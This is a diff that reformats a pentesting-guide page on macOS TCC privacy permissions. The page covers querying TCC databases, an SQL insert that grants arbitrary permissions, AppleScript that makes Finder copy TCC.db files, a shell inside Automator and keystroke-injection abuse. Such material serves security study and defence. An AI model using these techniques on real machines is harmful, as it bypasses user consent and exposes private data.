@@ -1,13 +1,12 @@
 # macOS TCC
 
-
 ## **Basic Information**
 
 **TCC (Transparency, Consent, and Control)** is a security protocol focusing on regulating application permissions. Its primary role is to safeguard sensitive features like **location services, contacts, photos, microphone, camera, accessibility, and full disk access**. By mandating explicit user consent before granting app access to these elements, TCC enhances privacy and user control over their data.
 
 Users encounter TCC when applications request access to protected features. This is visible through a prompt that allows users to **approve or deny access**. Furthermore, TCC accommodates direct user actions, such as **dragging and dropping files into an application**, to grant access to specific files, ensuring that applications have access only to what is explicitly permitted.
 
-![[https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855|An example of a TCC prompt]]
+![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)
 
 **TCC** is handled by the **daemon** located in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` and configured in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registering the mach service `com.apple.tccd.system`).
 
@@ -20,7 +19,7 @@ ps -ef | grep tcc
     0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
   501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 ```
-```
+
 Permissions are **inherited from the parent** application and the **permissions** are **tracked** based on the **Bundle ID** and the **Developer ID**.
 
 ### TCC Databases
@@ -59,7 +58,8 @@ The allowances/denies then stored in some TCC databases:
 
 #### Query the databases
 
-**user DB**
+{{#tabs}}
+{{#tab name="user DB"}}
 
 ```bash
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
@@ -77,9 +77,10 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
 # Check user denied permissions for telegram
 sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 ```
-```
 
-**system DB**
+{{#endtab}}
+
+{{#tab name="system DB"}}
 
 ```bash
 sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
@@ -100,8 +101,9 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
 # Check user denied permissions for telegram
 sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 ```
-```
 
+{{#endtab}}
+{{#endtabs}}
 
 > [!TIP]
 > Checking both databases you can check the permissions an app has allowed, has forbidden, or doesn't have (it will ask for it).
@@ -110,9 +112,9 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 - The **`client`** is the **bundle ID** or **path to binary** with the permissions
 - The **`client_type`** indicates whether it’s a Bundle Identifier(0) or an absolute path(1)
 
+<details>
 
-**How to execute if it's an absolute path**
-
+<summary>How to execute if it's an absolute path</summary>
 
 Just do **`launctl load you_bin.plist`**, with a plist like:
 
@@ -152,7 +154,8 @@ Just do **`launctl load you_bin.plist`**, with a plist like:
 </dict>
 </plist>
 ```
-```
+
+</details>
 
 - The **`auth_value`** can have different values: denied(0), unknown(1), allowed(2), or limited(3).
 - The **`auth_reason`** can take the following values: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
@@ -173,8 +176,8 @@ echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
 REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
 echo "X'$REQ_HEX'"
 ```
-```
-- For more information about the **other fields** of the table [[https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive|**check this blog post**]].
+
+- For more information about the **other fields** of the table [**check this blog post**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
 
 You could also check **already given permissions** to apps in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.
 
@@ -190,7 +193,7 @@ tccutil reset All app.some.id
 # Reset the permissions granted to all apps
 tccutil reset All
 ```
-```
+
 ### TCC Signature Checks
 
 The TCC **database** stores the **Bundle ID** of the application, but it also **stores** **information** about the **signature** to **make sure** the App asking to use the a permission is the correct one.
@@ -206,7 +209,7 @@ echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E00000000000
 csreq -t -r /tmp/telegram_csreq.bin
 (anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
 ```
-```
+
 > [!WARNING]
 > Therefore, other applications using the same name and bundle ID won't be able to access granted permissions given to other apps.
 
@@ -229,13 +232,13 @@ com.apple.private.tcc.allow
     kTCCServiceAddressBook
 </array>
 ```
-```
+
 This will avoid Calendar ask the user to access reminders, calendar and the address book.
 
 > [!TIP]
-> Apart from some official documentation about entitlements it's also possible to find unofficial **interesting information about entitlements in** [[https://newosxbook.com/ent.jl|**https://newosxbook.com/ent.jl**]]
+> Apart from some official documentation about entitlements it's also possible to find unofficial **interesting information about entitlements in** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
 
-Some TCC permissions are: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... There is no public list that defines all of them but you can check this [[https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service|**list of known ones**]].
+Some TCC permissions are: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... There is no public list that defines all of them but you can check this [**list of known ones**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
 
 ### Sensitive unprotected places
 
@@ -261,13 +264,13 @@ Filename,Header,App UUID
 otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
     uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
-```
+
 > [!TIP]
 > It's curious that the **`com.apple.macl`** attribute is managed by the **Sandbox**, not tccd.
 >
 > Also note that if you move a file that allows the UUID of an app in your computer to a different computer, because the same app will have different UIDs, it won't grant access to that app.
 
-The extended attribute `com.apple.macl` **can’t be cleared** like other extended attributes because it’s **protected by SIP**. However, as [[https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/|**explained in this post**]], it's possible to disable it **zipping** the file, **deleting** it and **unzipping** it.
+The extended attribute `com.apple.macl` **can’t be cleared** like other extended attributes because it’s **protected by SIP**. However, as [**explained in this post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), it's possible to disable it **zipping** the file, **deleting** it and **unzipping** it.
 
 ## TCC Privesc & Bypasses
 
@@ -275,9 +278,9 @@ The extended attribute `com.apple.macl` **can’t be cleared** like other extend
 
 If at some point you manage to get write access over a TCC database you can use something like the following to add an entry (remove the comments):
 
+<details>
 
-**Insert into TCC example**
-
+<summary>Insert into TCC example</summary>
 
 ```sql
 INSERT INTO access (
@@ -318,19 +321,26 @@ INSERT INTO access (
     strftime('%s', 'now') -- last_reminded with default current timestamp
 );
 ```
-```
+
+</details>
 
 ### TCC Payloads
 
 If you managed to get inside an app with some TCC permissions check the following page with TCC payloads to abuse them:
 
-[[macos-tcc-payloads.md]]
+
+{{#ref}}
+macos-tcc-payloads.md
+{{#endref}}
 
 ### Apple Events
 
 Learn about Apple Events in:
 
-[[macos-apple-events.md]]
+
+{{#ref}}
+macos-apple-events.md
+{{#endref}}
 
 ### Automation (Finder) to FDA\*
 
@@ -340,7 +350,8 @@ This specific TCC permission also indicates the **application that can be manage
 **Finder** is an application that **always has FDA** (even if it doesn't appear in the UI), so if you have **Automation** privileges over it, you can abuse its privileges to **make it do some actions**.\
 In this case your app would need the permission **`kTCCServiceAppleEvents`** over **`com.apple.Finder`**.
 
-**Steal users TCC.db**
+{{#tabs}}
+{{#tab name="Steal users TCC.db"}}
 
 ```applescript
 # This AppleScript will copy the system TCC database into /tmp
@@ -353,9 +364,10 @@ tell application "Finder"
 end tell
 EOD
 ```
-```
 
-**Steal systems TCC.db**
+{{#endtab}}
+
+{{#tab name="Steal systems TCC.db"}}
 
 ```applescript
 osascript<<EOD
@@ -366,8 +378,9 @@ tell application "Finder"
 end tell
 EOD
 ```
-```
 
+{{#endtab}}
+{{#endtabs}}
 
 You could abuse this to **write your own user TCC database**.
 
@@ -378,15 +391,14 @@ You could abuse this to **write your own user TCC database**.
 
 This is the TCC prompt to get Automation privileges over Finder:
 
-![[../../../../images/image (27).png]]
-
+<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>
 
 > [!CAUTION]
 > Note that because the **Automator** app has the TCC permission **`kTCCServiceAppleEvents`**, it can **control any app**, like Finder. So having the permission to control Automator you could also control the **Finder** with a code like the one below:
 
+<details>
 
-**Get a shell inside Automator**
-
+<summary>Get a shell inside Automator</summary>
 
 ```applescript
 osascript<<EOD
@@ -407,7 +419,8 @@ end tell
 EOD
 # Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
 ```
-```
+
+</details>
 
 Same happens with **Script Editor app,** it can control Finder, but using an AppleScript you cannot force it to execute a script.
 
@@ -456,7 +469,7 @@ EOD
 touch "$HOME/Desktop/file"
 rm "$HOME/Desktop/file"
 ```
-```
+
 ### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** to FDA\*
 
 Automation on **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) allows to send **keystrokes to processes**. This way you could abuse Finder to change the users TCC.db or to give FDA to an arbitrary app (although password might be prompted for this).
@@ -508,10 +521,10 @@ tell application "System Events"
 end tell
 EOF
 ```
-```
+
 ### `kTCCServiceAccessibility` to FDA\*
 
-Check this page for some [[macos-tcc-payloads.md#accessibility|**payloads to abuse the Accessibility permissions**]] to privesc to FDA\* or run a keylogger for example.
+Check this page for some [**payloads to abuse the Accessibility permissions**](macos-tcc-payloads.md#accessibility) to privesc to FDA\* or run a keylogger for example.
 
 ### **Endpoint Security Client to FDA**
 
@@ -549,7 +562,7 @@ For example to add terminal:
 # Get needed info
 codesign -d -r- /System/Applications/Utilities/Terminal.app
 ```
-```
+
 AllowApplicationsList.plist:
 
 ```xml
@@ -574,17 +587,15 @@ AllowApplicationsList.plist:
 </dict>
 </plist>
 ```
-```
+
 ### TCC Bypasses
 
 [[macos-tcc-bypasses/]]
 
 ## References
 
-- [[https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive|**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**]]
-- [[https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command|**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**]]
-- [[https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/|**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**]]
-- [[https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/|**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**]]
-
-
+- [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
+- [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
+- [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
+- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
 
